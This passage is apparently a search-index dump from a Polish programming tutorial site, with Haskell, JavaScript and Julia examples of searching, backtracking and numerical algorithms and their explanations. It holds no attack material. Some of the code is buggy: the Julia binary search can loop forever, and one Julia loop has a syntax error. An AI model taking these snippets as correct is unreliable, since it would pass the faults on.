9, 10, 5, 4, 2, 7, 18, 0]\n  let num = 7\n\n  let index = linearSearch arr num 0\n\n  if index == -1\n    then putStrLn \"Liczby nie ma w tablicy\"\n    else do \n        putStr \"Liczba jest pod indeksem \"\n        print index\n</code></pre>"},{"location":"programming/haskell/algorithms/searching/linear-search/#opis_1","title":"Opis","text":"<p>Funkcja <code>linearSearch</code> (linie 1 i 2) zwraca jako wynik liczb\u0119 ca\u0142kowit\u0105 i przyjmuje trzy argumenty: tablic\u0119 do przeszukania, warto\u015b\u0107 poszukiwanego elementu oraz numer obecnie sprawdzanego indeksu. Je\u017celi tablica jest pusta to funkcja zwraca warto\u015b\u0107 <code>-1</code> informuj\u0105c\u0105 o tym, \u017ce poszukiwanego elementu nie znaleziono w tablicy (linia 1). Jest to tzw. warunek stopu rekurencji. Je\u017celi w tablicy pozosta\u0142y jeszcze jakie\u015b elementy do sprawdzenia, to sprawdzamy, czy pierwszy element tablicy (pobrany za pomoc\u0105 funkcji <code>head</code>) jest poszukiwan\u0105 warto\u015bci\u0105 (linia 3). Je\u017celi tak, to funkcja zwraca jako wynik warto\u015b\u0107 <code>ind</code> (linia 3). W przeciwnym przypadku wywo\u0142ujemy rekurencyjnie funkcj\u0119 <code>linearSearch</code>, jako argumenty przekazuj\u0105c list\u0119 bez pierwszego elementu (do tego u\u017cywamy funkcji <code>tail</code>), warto\u015b\u0107 poszukiwanego elementu oraz indeks zwi\u0119kszony o jeden.</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 8) oraz warto\u015b\u0107 poszukiwanego elementu (linia 9). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>index</code> (linia 11). W zale\u017cno\u015bci od wyniku (linia 13) wypisujemy odpowiedni komunikat (linie 14, 16 i 17).</p>"},{"location":"programming/haskell/algorithms/searching/linear-search/#wszystkie-pozycje-elementu","title":"Wszystkie pozycje elementu","text":""},{"location":"programming/haskell/algorithms/searching/linear-search/#implementacja_2","title":"Implementacja","text":"<pre><code>linearSearch [] num ind = []\nlinearSearch arr num ind\n    | head arr == num = ind : linearSearch (tail arr) num (ind + 1)\n    | otherwise = linearSearch (tail arr) num (ind + 1)\n\nmain = do\n  let arr = [8, 7, 9, 10, 5, 4, 2, 7, 18, 7]\n  let num = 7\n\n  let indexes = linearSearch arr num 0\n\n  print indexes\n</code></pre>"},{"location":"programming/haskell/algorithms/searching/linear-search/#opis_2","title":"Opis","text":"<p>Funkcja <code>linearSearch</code> przyjmuje trzy argumenty: list\u0119 <code>arr</code>, szukan\u0105 liczb\u0119 <code>num</code> oraz bie\u017c\u0105cy indeks <code>ind</code>.</p> <ol> <li>Warunek bazowy: je\u015bli lista jest pusta (<code>[]</code>), funkcja zwraca pust\u0105 list\u0119, co oznacza koniec wyszukiwania.</li> <li>Wyszukiwanie: w ka\u017cdym kroku rekurencyjnym, funkcja sprawdza, czy pierwszy element listy (<code>head arr</code>) jest r\u00f3wny szukanej liczbie (<code>num</code>).</li> <li>Znalezienie elementu: je\u015bli tak, dodaje obecny indeks (<code>ind</code>) do listy wynikowej i kontynuuje wyszukiwanie na reszcie listy (<code>tail arr</code>), inkrementuj\u0105c indeks (<code>ind + 1</code>).</li> <li>Przechodzenie dalej: je\u015bli nie, funkcja kontynuuje wyszukiwanie na reszcie listy bez dodawania indeksu do listy wynikowej.</li> </ol> <p>W g\u0142\u00f3wnej cz\u0119\u015bci programu (<code>main</code>) definiujemy list\u0119 <code>arr</code> i liczb\u0119 <code>num</code>, kt\u00f3rej indeksy chcemy znale\u017a\u0107. Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z tymi parametrami. Otrzymana lista <code>indexes</code> zawiera wszystkie indeksy, pod kt\u00f3rymi znajduje si\u0119 liczba <code>num</code> w li\u015bcie <code>arr</code>.</p>"},{"location":"programming/haskell/algorithms/searching/min-or-max/","title":"Wyszukiwanie minimum i maksimum","text":""},{"location":"programming/haskell/algorithms/searching/min-or-max/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/haskell/algorithms/searching/min-or-max/#wyszukiwanie-wartosci-minimum-i-maksimum","title":"Wyszukiwanie warto\u015bci minimum i maksimum","text":""},{"location":"programming/haskell/algorithms/searching/min-or-max/#implementacja","title":"Implementacja","text":"<pre><code>findMin [element] = element\nfindMin (element:rest) = min element (findMin rest)\n\nfindMax [element] = element\nfindMax (element:rest) = max element (findMax rest)\n\nmain = do\n  let lst = [8, 2, 9, 10, 5, 4, 2, 7, 18, 0]\n\n  let minValue = findMin lst\n  let maxValue = findMax lst\n\n  putStrLn $ \"Min: \" ++ show minValue\n  putStrLn $ \"Max: \" ++ show maxValue\n</code></pre>"},{"location":"programming/haskell/algorithms/searching/min-or-max/#opis-implementacji","title":"Opis implementacji","text":"<p>Obie funkcje dzia\u0142aj\u0105 na podobnym mechanizmie, ale z r\u00f3\u017cnym celem: <code>findMin</code> szuka najmniejszej warto\u015bci, a <code>findMax</code> najwi\u0119kszej. W przypadku, gdy lista zawiera tylko jeden element, funkcja zwraca ten element, poniewa\u017c nie ma z czym go por\u00f3wnywa\u0107. Jednak gdy lista ma wi\u0119cej element\u00f3w, funkcje wykorzystuj\u0105 podej\u015bcie rekurencyjne. Por\u00f3wnuj\u0105 pierwszy element listy z wynikiem, kt\u00f3ry otrzymuj\u0105, wywo\u0142uj\u0105c si\u0119 rekurencyjnie na pozosta\u0142ej cz\u0119\u015bci listy. Dla <code>findMin</code>, wybieraj\u0105 mniejsz\u0105 warto\u015b\u0107, natomiast dla <code>findMax</code> - wi\u0119ksz\u0105.</p> <p>W sekcji <code>main</code>, definiujemy list\u0119 <code>lst</code>, kt\u00f3ra zawiera zestaw liczb ca\u0142kowitych. Nast\u0119pnie, aby znale\u017a\u0107 warto\u015b\u0107 minimaln\u0105 i maksymaln\u0105 na tej li\u015bcie, stosujemy nasze funkcje <code>findMin</code> i <code>findMax</code>. Po znalezieniu tych warto\u015bci, wyniki s\u0105 prezentowane u\u017cytkownikowi za pomoc\u0105 prostego wydruku tekstowego.</p>"},{"location":"programming/haskell/algorithms/searching/sum-of-two/","title":"Suma dw\u00f3ch liczb","text":""},{"location":"programming/haskell/algorithms/searching/sum-of-two/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/haskell/algorithms/searching/sum-of-two/#rozwiazanie-optymalne","title":"Rozwi\u0105zanie optymalne","text":""},{"location":"programming/haskell/algorithms/searching/sum-of-two/#implementacja","title":"Implementacja","text":"<pre><code>sumOfTwo :: Int -&gt; [Int] -&gt; Int -&gt; IO ()\nsumOfTwo n tab sum = do\n    let result = findPair 0 (n - 1) tab\n    case result of\n        Just (x, y) -&gt; putStrLn $ show x ++ \", \" ++ show y\n        Nothing     -&gt; putStrLn \"-1\"\n  where\n    findPair :: Int -&gt; Int -&gt; [Int] -&gt; Maybe (Int, Int)\n    findPair left right tab\n        | left &gt;= right = Nothing\n        | tab !! left + tab !! right == sum = Just (tab !! left, tab !! right)\n        | tab !! left + tab !! right &lt; sum = findPair (left + 1) right tab\n        | otherwise = findPair left (right - 1) tab\n\nmain :: IO ()\nmain = do\n    let n = 10\n    let tab = [1, 2, 4, 6, 8, 9, 10, 12, 13, 15]\n    let sum = 18\n    sumOfTwo n tab sum\n</code></pre>"},{"location":"programming/javascript/","title":"JavaScript","text":"<p>JavaScript zwany jest tak\u017ce j\u0119zykiem Internetu. Wykorzystywany jest przede wszystkim na stronach internetowych, g\u0142\u00f3wnie do obs\u0142ugi interakcji z u\u017cytkownikiem. Mi\u0119dzy innymi dlatego cieszy si\u0119 du\u017c\u0105 popularno\u015bci\u0105. Wbrew swojej nazwie, JavaScript ma niewiele wsp\u00f3lnego z j\u0119zykiem Java, a historycznie bli\u017cej mu do j\u0119zyka C.</p> <p>Strona j\u0119zyka JavaScript</p>"},{"location":"programming/javascript/#kluczowe-cechy","title":"Kluczowe cechy","text":"<ol> <li> <p>Dynamiczna typizacja: JavaScript to j\u0119zyk dynamicznie typowany, co oznacza, \u017ce typy zmiennych mog\u0105 by\u0107 zmieniane w trakcie wykonywania programu.</p> </li> <li> <p>Wsparcie dla wielu paradygmat\u00f3w programowania: JavaScript obs\u0142uguje zar\u00f3wno programowanie proceduralne, jak i obiektowe, a w ostatnich latach wprowadzono r\u00f3wnie\u017c funkcje zwi\u0105zane z programowaniem funkcyjnym.</p> </li> <li> <p>Interakcje z u\u017cytkownikiem i manipulacje stron\u0105 internetow\u0105: JavaScript umo\u017cliwia tworzenie interaktywnych stron internetowych, reaguj\u0105cych na dzia\u0142ania u\u017cytkownika, manipulacj\u0119 elementami DOM (Document Object Model), a tak\u017ce obs\u0142ug\u0119 zdarze\u0144.</p> </li> <li> <p>Backend i technologie server-side: dzi\u0119ki platformie Node.js, JavaScript mo\u017ce by\u0107 u\u017cywany po stronie serwera, co pozwala programistom pisa\u0107 ca\u0142e aplikacje tylko w jednym j\u0119zyku.</p> </li> <li> <p>Bogaty ekosystem: JavaScript posiada rozbudowany ekosystem bibliotek i framework\u00f3w (np. React, Angular, Vue.js), kt\u00f3re u\u0142atwiaj\u0105 rozwijanie skomplikowanych aplikacji.</p> </li> </ol> <p>JavaScript sta\u0142 si\u0119 nieodzown\u0105 cz\u0119\u015bci\u0105 Internetu, a jego rola stale si\u0119 zwi\u0119ksza, zar\u00f3wno w kontek\u015bcie aplikacji internetowych, jak i w kontek\u015bcie tworzenia aplikacji na serwery czy na urz\u0105dzenia mobilne.</p>"},{"location":"programming/javascript/#sciaga","title":"\u015aci\u0105ga","text":"<p>\u015aci\u0105ga</p>"},{"location":"programming/javascript/#gry","title":"Gry","text":"<p>Ciekawe gry do \u0107wiczenia zagadnie\u0144 zwi\u0105zanych z j\u0119zykiem JavaScript:</p> <p>Untrusted</p> <p>Elevator Saga</p>"},{"location":"programming/javascript/#popularnosc-jezyka","title":"Popularno\u015b\u0107 j\u0119zyka","text":"<p>Wykres popularno\u015bci j\u0119zyka JavaScript</p>"},{"location":"programming/javascript/algorithms/searching/linear-search/","title":"Wyszukiwanie liniowe","text":""},{"location":"programming/javascript/algorithms/searching/linear-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/javascript/algorithms/searching/linear-search/#istnienie-elementu","title":"Istnienie elementu","text":""},{"location":"programming/javascript/algorithms/searching/linear-search/#implementacja","title":"Implementacja","text":"<pre><code>function linearSearch(array, value) {\n    for (let i = 0; i &lt; array.length; i++) {\n        if (array[i] == value) {\n            return true;\n        }\n    }\n\n    return false;\n}\n\nlet array = [8, 2, 9, 10, 5, 4, 2, 7, 18, 0];\nlet value = 7;\n\nlet result = linearSearch(array, value);\n\nif (result) {\n    console.log(\"Liczba jest w tablicy\");\n} else {\n    console.log(\"Liczby nie ma w tablicy\");\n}\n</code></pre>"},{"location":"programming/javascript/algorithms/searching/linear-search/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) zwraca jako wynik warto\u015b\u0107 prawda/fa\u0142sz i przyjmuje dwa argumenty: tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(0\\) do rozmiaru tablicy minus jeden (linia 2). Rozmiar tablicy pobieramy za pomoc\u0105 w\u0142asno\u015bci <code>length</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to zwracamy informacj\u0119 o znalezieniu warto\u015bci w tablicy (linia 4). Po przej\u015bciu przez wszystkie indeksy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 <code>false</code> informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w tablicy (linia 8).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 12) oraz warto\u015b\u0107 poszukiwanego elementu (linia 13). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>result</code> (linia 15). W zale\u017cno\u015bci od wyniku (linia 17) wypisujemy odpowiedni komunikat (linie 18 i 20).</p>"},{"location":"programming/javascript/algorithms/searching/linear-search/#pozycja-elementu","title":"Pozycja elementu","text":""},{"location":"programming/javascript/algorithms/searching/linear-search/#implementacja_1","title":"Implementacja","text":"<pre><code>function linearSearch(array, value) {\n    for (let i = 0; i &lt; array.length; i++) {\n        if (array[i] == value) {\n            return i;\n        }\n    }\n\n    return -1;\n}\n\nlet array = [8, 2, 9, 10, 5, 4, 2, 7, 18, 0];\nlet value = 7;\n\nlet index = linearSearch(array, value);\n\nif (index == -1) {\n    console.log(\"Liczby nie ma w tablicy\");\n} else {\n    console.log(\"Liczba jest pod indeksem \", index);\n}\n</code></pre>"},{"location":"programming/javascript/algorithms/searching/linear-search/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) zwraca jako wynik liczb\u0119 ca\u0142kowit\u0105 i przyjmuje dwa argumenty: tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(0\\) do rozmiaru tablicy minus jeden (linia 2). Rozmiar tablicy pobieramy za pomoc\u0105 w\u0142asno\u015bci <code>length</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to zwracamy indeks tej warto\u015bci w tablicy (linia 4). Po przej\u015bciu przez wszystkie indeksy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 <code>-1</code> informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w tablicy (linia 8).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 12) oraz warto\u015b\u0107 poszukiwanego elementu (linia 13). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>index</code> (linia 15). W zale\u017cno\u015bci od wyniku (linia 17) wypisujemy odpowiedni komunikat (linie 18 i 20).</p>"},{"location":"programming/javascript/algorithms/searching/linear-search/#wszystkie-pozycje-elementu","title":"Wszystkie pozycje elementu","text":""},{"location":"programming/javascript/algorithms/searching/linear-search/#implementacja_2","title":"Implementacja","text":"<pre><code>function linearSearch(array, value) {\n    for (let i = 0; i &lt; array.length; i++) {\n        if (array[i] == value) {\n            console.log(i);\n        }\n    }\n}\n\nlet array = [8, 2, 8, 4, 5, 6, 7, 8, 9, 8];\nlet value = 8;\n\nconsole.log(\"Indeksy, pod kt\u00f3rymi znajduje si\u0119 poszukiwana liczba:\")\nlinearSearch(array, value);\n</code></pre>"},{"location":"programming/javascript/algorithms/searching/linear-search/#opis-implementacji_2","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) nie zwraca wyniku i przyjmuje dwa argumenty: tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(0\\) do rozmiaru tablicy minus jeden (linia 2). Rozmiar tablicy pobieramy za pomoc\u0105 w\u0142asno\u015bci <code>length</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to wypisujemy ten indeks (linia 4).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 10) oraz warto\u015b\u0107 poszukiwanego elementu (linia 11). Nast\u0119pnie wypisujemy stosowny komunikat (linia 13) wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami (linia 14).</p>"},{"location":"programming/julia/","title":"Julia","text":"<p>Julia to nowoczesny j\u0119zyk programowania o wysokiej wydajno\u015bci, skierowany szczeg\u00f3lnie do oblicze\u0144 naukowych i numerycznych. Zosta\u0142 stworzony w celu rozwi\u0105zania problemu \"dw\u00f3ch j\u0119zyk\u00f3w\", czyli zmuszania programist\u00f3w do pisania prototyp\u00f3w w jednym j\u0119zyku (np. Python, MATLAB), a nast\u0119pnie przepisywania ich na j\u0119zyk kompilowany (np. C, C++) dla zwi\u0119kszenia wydajno\u015bci. J\u0119zyk ten zosta\u0142 zaprojektowany tak, aby m\u00f3g\u0142 by\u0107 \u0142atwo zrozumiany przez ludzi, oferuj\u0105c jednocze\u015bnie szybko\u015b\u0107 na poziomie j\u0119zyk\u00f3w kompilowanych.</p> <p> Julia</p>"},{"location":"programming/julia/#kluczowe-cechy","title":"Kluczowe cechy","text":"<ol> <li> <p>Wysoka wydajno\u015b\u0107: Julia oferuje wydajno\u015b\u0107 por\u00f3wnywaln\u0105 do takich j\u0119zyk\u00f3w jak C i Fortran, dzi\u0119ki czemu jest idealnym narz\u0119dziem do intensywnych oblicze\u0144 numerycznych.</p> </li> <li> <p>Dynamiczna typizacja: Julia jest dynamicznie typizowanym j\u0119zykiem, co oznacza, \u017ce typy zmiennych mog\u0105 by\u0107 zmieniane w trakcie wykonywania programu.</p> </li> <li> <p>Wsparcie dla programowania r\u00f3wnoleg\u0142ego i rozproszonego: Julia ma wbudowane mechanizmy do \u0142atwego tworzenia program\u00f3w r\u00f3wnoleg\u0142ych i rozproszonych, co jest kluczowe dla wielu zastosowa\u0144 obliczeniowych.</p> </li> <li> <p>Interoperacyjno\u015b\u0107 z innymi j\u0119zykami: Julia mo\u017ce \u0142atwo wywo\u0142ywa\u0107 funkcje napisane w C i Fortranie, a tak\u017ce interaktywnie korzysta\u0107 z Pythona, co pozwala na korzystanie z ju\u017c istniej\u0105cych bibliotek w tych j\u0119zykach.</p> </li> <li> <p>Du\u017cy zestaw wbudowanych narz\u0119dzi do analizy danych i nauki maszynowej: Julia posiada rozleg\u0142y ekosystem pakiet\u00f3w, kt\u00f3ry obejmuje takie obszary jak analiza danych, nauka maszynowa, optymalizacja i wiele innych.</p> </li> </ol> <p>Julia jest coraz cz\u0119\u015bciej wykorzystywana w dziedzinach nauki, in\u017cynierii i finans\u00f3w, gdzie du\u017ce zestawy danych i skomplikowane obliczenia numeryczne s\u0105 norm\u0105.</p>"},{"location":"programming/julia/#popularnosc-jezyka","title":"Popularno\u015b\u0107 j\u0119zyka","text":"<p>Wykres popularno\u015bci j\u0119zyka Julia</p>"},{"location":"programming/julia/algorithms/backtracking/n-queens/","title":"Problem n kr\u00f3lowych","text":""},{"location":"programming/julia/algorithms/backtracking/n-queens/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/julia/algorithms/backtracking/n-queens/#implementacja","title":"Implementacja","text":"<pre><code>function checkNewPosition(x, y, positions)\n    for i in 1:x\n        if positions[i] == y || y - positions[i] == x - i || y - positions[i] == i - x\n            return false\n        end\n    end\n\n    return true\nend\n\nfunction findSolution(n, queenId, positions)\n    if queenId == n + 1\n        return true\n    end\n\n    for i in 1:n\n        if !checkNewPosition(queenId, i, positions)\n            continue\n        end\n\n        positions[queenId] = i\n\n        if findSolution(n, queenId + 1, positions)\n            return true\n        end\n    end\n\n    return false\nend\n\nfunction printCheckboard(n, positions)\n    board = zeros(Int, n, n)\n\n    for i in 1:n\n        board[positions[i], i] = 1\n    end\n\n    display(board)\nend\n\nn = 5\npositions = zeros(Int, n)\n\nresult = findSolution(n, 1, positions)\n\nif result\n    printCheckboard(n, positions)\nend\n</code></pre>"},{"location":"programming/julia/algorithms/numerical-methods/fast-exp/","title":"Szybkie pot\u0119gowanie","text":""},{"location":"programming/julia/algorithms/numerical-methods/fast-exp/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/julia/algorithms/numerical-methods/fast-exp/#rozwiazanie-iteracyjne","title":"Rozwi\u0105zanie iteracyjne","text":"<pre><code>function fastExp(a, n)\n    result = 1\n\n    while n &gt; 0\n        if n % 2 == 1\n            result *= a\n        end\n\n        a *= a\n        n \u00f7= 2\n    end\n\n    return result\nend\n\nprintln(fastExp(2, 10))\n</code></pre>"},{"location":"programming/julia/algorithms/numerical-methods/monte-carlo/","title":"Metoda Monte Carlo","text":""},{"location":"programming/julia/algorithms/numerical-methods/monte-carlo/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/julia/algorithms/numerical-methods/monte-carlo/#obliczanie-wartosci-liczby-pi","title":"Obliczanie warto\u015bci liczby PI","text":"<pre><code>function MonteCarloPi(pointsCount)\n    pointsInCircleCount = 0\n    centerX = 1\n    centerY = 1\n    radius = 1\n\n    for i in 1:pointsCount\n        x = rand() * 2\n        y = rand() * 2\n        distance = (x - centerX)^2 + (y - centerY)^2\n\n        if distance &lt;= radius^2\n            pointsInCircleCount += 1\n        end\n    end\n\n    return (4 * pointsInCircleCount) / pointsCount\nend\n\nprintln(MonteCarloPi(100000000))\n</code></pre>"},{"location":"programming/julia/algorithms/searching/binary-search/","title":"Wyszukiwanie binarne","text":""},{"location":"programming/julia/algorithms/searching/binary-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/julia/algorithms/searching/binary-search/#wersja-iteracyjna","title":"Wersja iteracyjna","text":""},{"location":"programming/julia/algorithms/searching/binary-search/#implementacja","title":"Implementacja","text":"<pre><code>function binarySearch(array, number)\n    left = 1\n    right = length(array)\n\n    while left &lt;= right\n        middle = (left + right) \u00f7 2\n\n        if number &lt; array[middle]\n            right = middle\n        elseif number &gt; array[middle]\n            left = middle + 1\n        else\n            return middle\n        end\n    end\n\n    return -1\nend\n\narray = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\nnumber = 8\n\nprintln(binarySearch(array, number))\n</code></pre>"},{"location":"programming/julia/algorithms/searching/linear-search/","title":"Wyszukiwanie liniowe","text":""},{"location":"programming/julia/algorithms/searching/linear-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/julia/algorithms/searching/linear-search/#istnienie-elementu","title":"Istnienie elementu","text":""},{"location":"programming/julia/algorithms/searching/linear-search/#implementacja","title":"Implementacja","text":"<pre><code>function linearSearch(array, number)\n    for el in array\n        if el == number\n            return true\n        end\n    end\n\n    return false\nend\n\narray = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\nnumber = 8\n\nresult = linearSearch(array, number)\n\nif result\n    println(\"Poszukiwana warto\u015b\u0107 jest w li\u015bcie\")\nelse\n    println(\"Poszukiwanej warto\u015bci nie ma w li\u015bcie\")\nend\n</code></pre>"},{"location":"programming/julia/algorithms/searching/linear-search/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) zwraca jako wynik warto\u015b\u0107 prawda/fa\u0142sz i przyjmuje dwa argumenty: list\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne elementy listy (linia 2). Dla ka\u017cdego elementu sprawdzamy, czy jego warto\u015b\u0107 jest t\u0105, kt\u00f3rej szukamy (linia 3). Je\u017celi tak, to zwracamy informacj\u0119 o znalezieniu warto\u015bci w li\u015bcie (linia 4). Po przej\u015bciu przez wszystkie elementy listy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 <code>false</code> informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w li\u015bcie (linia 8).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: list\u0119 (linia 12) oraz warto\u015b\u0107 poszukiwanego elementu (linia 13). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>result</code> (linia 15). W zale\u017cno\u015bci od wyniku (linia 17) wypisujemy odpowiedni komunikat (linie 18 i 20).</p>"},{"location":"programming/julia/algorithms/searching/linear-search/#pozycja-elementu","title":"Pozycja elementu","text":"<pre><code>function linearSearch(array, number)\n    for i in eachindex(array)\n        if number == array[i]\n            return i\n        end\n    end\n\n    return -1\nend\n\narray = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\nnumber = 8\n\nindex = linearSearch(array, number)\n\nif index == -1\n    println(\"Poszukiwanej warto\u015bci nie ma w li\u015bcie\")\nelse\n    println(\"Poszukiwana warto\u015b\u0107 znajduje si\u0119 pod indeksem \", index)\nend\n</code></pre>"},{"location":"programming/julia/algorithms/searching/linear-search/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) zwraca jako wynik liczb\u0119 ca\u0142kowit\u0105 i przyjmuje dwa argumenty: list\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w li\u015bcie od \\(1\\) do d\u0142ugo\u015bci listy w\u0142\u0105cznie (linia 2). Rozmiar listy pobieramy za pomoc\u0105 funkcji <code>lenght()</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w li\u015bcie znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to zwracamy indeks warto\u015bci w li\u015bcie (linia 4). Po przej\u015bciu przez wszystkie indeksy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 \\(-1\\) informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w li\u015bcie (linia 8).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: list\u0119 (linia 12) oraz warto\u015b\u0107 poszukiwanego elementu (linia 13). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>index</code> (linia 15). W zale\u017cno\u015bci od wyniku (linia 17) wypisujemy odpowiedni komunikat (linie 18 i 20).</p>"},{"location":"programming/julia/algorithms/searching/linear-search/#wszystkie-pozycje-elementu","title":"Wszystkie pozycje elementu","text":""},{"location":"programming/julia/algorithms/searching/linear-search/#implementacja_1","title":"Implementacja","text":"<pre><code>function linearSearch(array, number)\n    for i in eachindex(array))\n        if number == array[i]\n            println(i)\n        end\n    end\nend\n\narray = [8, 2, 8, 4, 5, 6, 7, 8, 9, 8]\nnumber = 8\n\nprintln(\"Poszukiwana warto\u015b\u0107 znajduje si\u0119 pod nast\u0119puj\u0105cymi indeksami:\")\nlinearSearch(array, number)\n</code></pre>"},{"location":"programming/julia/algorithms/searching/linear-search/#opis-implementacji_2","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) nie zwraca wyniku i przyjmuje dwa argumenty: list\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w li\u015bcie od \\(1\\) do d\u0142ugo\u015bci listy w\u0142\u0105cznie (linia 2). Rozmiar listy pobieramy za pomoc\u0105 funkcji <code>length()</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w li\u015bcie znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to wypisujemy ten indeks (linia 4).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: list\u0119 (linia 10) oraz warto\u015b\u0107 poszukiwanego elementu (linia 11). Nast\u0119pnie wypisujemy stosowny komunikat (linia 13) i wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami (linia 14).</p>"},{"location":"programming/julia/algorithms/searching/longest-growing-substring/","title":"Najd\u0142u\u017cszy sp\u00f3jny podci\u0105g rosn\u0105cy","text":""},{"location":"programming/julia/algorithms/searching/longest-growing-substring/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/julia/algorithms/searching/longest-growing-substring/#implementacja","title":"Implementacja","text":"<pre><code>function longestGrowingSubstring(array)\n    maxLength = 1\n    currentLength = 1\n\n    for i in 2:length(array)\n        if array[i] &gt; array[i - 1]\n            currentLength += 1\n            maxLength = max(maxLength, currentLength)\n        else\n            currentLength = 1\n        end\n    end\n\n    return maxLength\nend\n\narray = [4, 9, 7, 2, 4, 7, 9, 3, 8, 6]\n\nprintln(longestGrowingSubstring(array))\n</code></pre>"},{"location":"programming/julia/algorithms/searching/majority/","title":"Znajdowanie lidera w zbiorze","text":""},{"location":"programming/julia/algorithms/searching/majority/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/julia/algorithms/searching/majority/#implementacja","title":"Implementacja","text":"<pre><code>function majority(array)\n    counter = 0\n    currentCandidate = 0\n\n    for el in array\n        if counter == 0\n            currentCandidate = el\n            counter = 1\n        elseif el == currentCandidate\n            counter += 1\n        else\n            counter -= 1\n        end\n    end\n\n    if count(x -&gt; x == currentCandidate, array) &gt; length(array) / 2\n        return currentCandidate\n    else\n        